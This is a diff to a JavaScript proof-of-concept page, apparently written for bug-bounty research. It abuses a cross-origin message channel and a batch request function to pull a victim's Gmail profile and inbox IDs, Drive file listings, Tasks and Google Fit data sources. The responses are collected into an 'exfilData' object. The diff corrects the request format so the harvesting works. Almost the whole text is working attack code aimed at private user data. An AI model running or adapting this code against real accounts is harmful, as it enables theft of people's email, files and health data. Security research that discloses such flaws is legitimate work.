@@ -132,34 +132,35 @@ window.addEventListener('message', function(e) {
       let data;
       try { data = JSON.parse(bodyStr); } catch(e) { data = { raw: bodyStr }; }
 
-      if (relUrl.includes('/gmail/v1/users/me/profile')) {
+      // relUrl = the key we set (gmail-profile, gmail-inbox, drive-files, tasks-lists, fit-sources)
+      if (relUrl === 'gmail-profile') {
         log('crit', '✅ GMAIL PROFILE: ' + data.emailAddress + ' (' + data.messagesTotal + ' messages)');
         addResult('✅ NEW-001: Gmail Profile', data, 'crit');
         exfilData['gmail_profile'] = data;
         resultsReceived++;
-      } else if (relUrl.includes('/gmail/v1/users/me/messages')) {
+      } else if (relUrl === 'gmail-inbox') {
         log('crit', '✅ GMAIL INBOX: ' + (data.messages||[]).length + ' message IDs');
         addResult('✅ NEW-001: Gmail Inbox', data, 'crit');
         exfilData['gmail_inbox'] = data;
         resultsReceived++;
-      } else if (relUrl.includes('/drive/v3/files')) {
+      } else if (relUrl === 'drive-files') {
         log('crit', '✅ DRIVE FILES: ' + (data.files||[]).length + ' files');
         (data.files||[]).forEach((f, i) => log('data', '  [' + i + '] ' + f.name + ' | ' + f.mimeType));
         addResult('✅ NEW-005: Drive Files', data, 'crit');
         exfilData['drive_files'] = data;
         resultsReceived++;
-      } else if (relUrl.includes('/tasks/v1/')) {
+      } else if (relUrl === 'tasks-lists') {
         log('crit', '✅ TASKS: ' + (data.items||[]).length + ' task lists');
         addResult('✅ NEW-003: Tasks', data, 'crit');
         exfilData['tasks'] = data;
         resultsReceived++;
-      } else if (relUrl.includes('/fitness/v1/')) {
+      } else if (relUrl === 'fit-sources') {
         log('crit', '✅ GOOGLE FIT: ' + (data.dataSource||[]).length + ' data sources');
         addResult('✅ NEW-004: Google Fit', data, 'crit');
         exfilData['fit'] = data;
         resultsReceived++;
       } else {
-        log('ok', '  [200] ' + relUrl + ': ' + JSON.stringify(data).substring(0, 200));
+        log('ok', '  [200] key=' + relUrl + ': ' + JSON.stringify(data).substring(0, 200));
         resultsReceived++;
       }
     } else if (status === 401) {
@@ -187,44 +188,35 @@ function sendRequests() {
 
   log('ok', 'Sending 5-API makeHttpRequests batch...');
 
+  // CORRECT format: {key, params: {url, httpMethod, headers, body}}
   const requests = [
     // NEW-001: Gmail Profile
     {
-      relative_url: '/gmail/v1/users/me/profile',
-      method: 'GET',
-      headers: {},
-      body: null
+      key: 'gmail-profile',
+      params: { url: '/gmail/v1/users/me/profile', httpMethod: 'GET', headers: {}, body: null }
     },
     // NEW-001: Gmail Inbox (first 10 IDs)
     {
-      relative_url: '/gmail/v1/users/me/messages?maxResults=10&labelIds=INBOX',
-      method: 'GET',
-      headers: {},
-      body: null
+      key: 'gmail-inbox',
+      params: { url: '/gmail/v1/users/me/messages?maxResults=10&labelIds=INBOX', httpMethod: 'GET', headers: {}, body: null }
     },
     // NEW-005: Drive Files
     {
-      relative_url: '/drive/v3/files' +
-           '?key=' + DRIVE_KEY +
-           '&fields=files(id,name,mimeType,modifiedTime,size)' +
-           '&pageSize=20&orderBy=modifiedTime+desc',
-      method: 'GET',
-      headers: {},
-      body: null
+      key: 'drive-files',
+      params: {
+        url: '/drive/v3/files?key=' + DRIVE_KEY + '&fields=files(id,name,mimeType,modifiedTime,size)&pageSize=20&orderBy=modifiedTime+desc',
+        httpMethod: 'GET', headers: {}, body: null
+      }
     },
     // NEW-003: Tasks
     {
-      relative_url: '/tasks/v1/users/@me/lists',
-      method: 'GET',
-      headers: {},
-      body: null
+      key: 'tasks-lists',
+      params: { url: '/tasks/v1/users/@me/lists', httpMethod: 'GET', headers: {}, body: null }
     },
     // NEW-004: Google Fit
     {
-      relative_url: '/fitness/v1/users/me/dataSources',
-      method: 'GET',
-      headers: {},
-      body: null
+      key: 'fit-sources',
+      params: { url: '/fitness/v1/users/me/dataSources', httpMethod: 'GET', headers: {}, body: null }
     }
   ];
 
